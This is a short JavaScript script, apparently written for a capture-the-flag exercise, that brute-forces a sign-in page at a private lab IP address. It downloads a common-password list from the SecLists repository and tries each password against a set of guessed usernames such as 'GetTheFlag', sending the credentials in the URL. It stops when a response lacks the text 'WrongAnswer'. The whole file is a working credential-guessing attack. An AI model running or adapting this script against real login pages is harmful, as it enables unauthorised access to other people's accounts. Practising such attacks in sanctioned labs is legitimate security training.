const PASS_URL =
  "https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/top-passwords-shortlist.txt";

async function customFetch(url) {
  const response = await fetch(url);
  return await response.text();
}

async function main() {
  const usernames = [
    //first names
    "one",
    "two",
    "three",
    "Flag",
    //surnames
    "me",
    "GetThe",
    //surname + first name
    "meone",
    "metwo",
    "methree",
    "GetTheFlag",
  ];
  const passwords = await customFetch(PASS_URL).then((text) =>
    text.trim().split("\n"),
  );

  await Promise.all(
    usernames.map(async (username) => {
      for (const password of passwords) {
        const html = await customFetch(
          `http://172.28.128.136/?page=signin&username=${username}&password=${password}&Login=Login`,
        );
        if (!html.includes("WrongAnswer")) {
          console.log(`Correct answer: ${username} ${password}`);
          process.exit(0);
        }
        console.log(`Wrong answer: ${username} ${password}`);
      }
    }),
  );
}

main();
